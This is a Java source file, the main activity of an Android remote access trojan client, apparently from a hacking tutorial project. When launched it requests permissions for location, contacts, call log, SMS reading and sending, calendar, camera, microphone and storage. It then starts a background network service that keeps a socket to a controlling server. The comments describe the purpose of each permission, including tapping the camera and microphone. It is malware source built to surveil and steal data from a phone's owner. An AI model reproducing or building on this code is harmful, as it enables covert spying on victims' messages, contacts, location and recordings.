package com.dev.ah10.androidratclient;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

//Created by: Advanced Hacking 101
//2000+ lines of code, i'm proud :)

@SuppressWarnings("SpellCheckingInspection")
public class MainActivity extends Activity {

    public static NetworkHandler nh; //Current NetworkHandler instance (set after the start of the service)
    @SuppressLint("StaticFieldLeak")
    public static Context context; //The application context (set in onCreate)

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        MainActivity.context = getApplicationContext(); //Set the application context for the service
        GetAllPermissions(); //Request all permissions from API 23
        setContentView(R.layout.activity_main);
        Intent i = new Intent(this, NetworkHandler.class); //Create a new intent to call the service
        startService(i); //Start the main Service
        Log.e("MainActivity", "NetworkHandler started");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.e("MainActivity", "onDestroy");
        nh.clientSocket.sendResponse("dclient"); //Send a disconnect to the server when the Activity is closing (service will restart with new socket)
    }

    private void GetAllPermissions() //Request all required permissions
    {
        if (Build.VERSION.SDK_INT < 23) return; //check if api level is right

        if (!PermissionCheck()) //If no access to location then request all permissions
        {
            int getPermission = 1;
            this.requestPermissions(new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION, //GPS Location (accurate)
                    Manifest.permission.ACCESS_COARSE_LOCATION, //Network, CellData, Wifi location (inaccurate)
                    Manifest.permission.READ_CONTACTS, //Get contacts and contacts data
                    Manifest.permission.WRITE_CONTACTS, //Add contacts to the list
                    Manifest.permission.READ_CALL_LOG, //Read the call log
                    Manifest.permission.READ_SMS, //Read SMS Messages
                    Manifest.permission.SEND_SMS, //Send SMS Messages
                    Manifest.permission.READ_CALENDAR, //List calendar events
                    Manifest.permission.WRITE_CALENDAR, //Add, modify, delete calendar events
                    Manifest.permission.CAMERA, //Camera photo, record, tap
                    Manifest.permission.RECORD_AUDIO, //Camera record, Mic record, tap
                    Manifest.permission.READ_EXTERNAL_STORAGE, //To check files
                    Manifest.permission.WRITE_EXTERNAL_STORAGE //To save recordings
            }, getPermission);
        }
    }

    private boolean PermissionCheck() //Check if required permissions are granted
    {
        if (Build.VERSION.SDK_INT < 23) return false;
        boolean gpsPermission =
                this.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                this.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        boolean contactsPermission =
                this.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED&&
                this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED;

        boolean callLogPermission =
                this.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;

        boolean smsPermission =
                this.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                this.checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED;

        boolean calendarPermission =
                this.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED &&
                this.checkSelfPermission(Manifest.permission.WRITE_CALENDAR) == PackageManager.PERMISSION_GRANTED;

        boolean mediaPermission =
                this.checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED &&
                this.checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;

        boolean fileSystemPermission =
                this.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                this.checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;

        return contactsPermission && gpsPermission && callLogPermission && smsPermission &&
                calendarPermission && mediaPermission && fileSystemPermission;
    }
}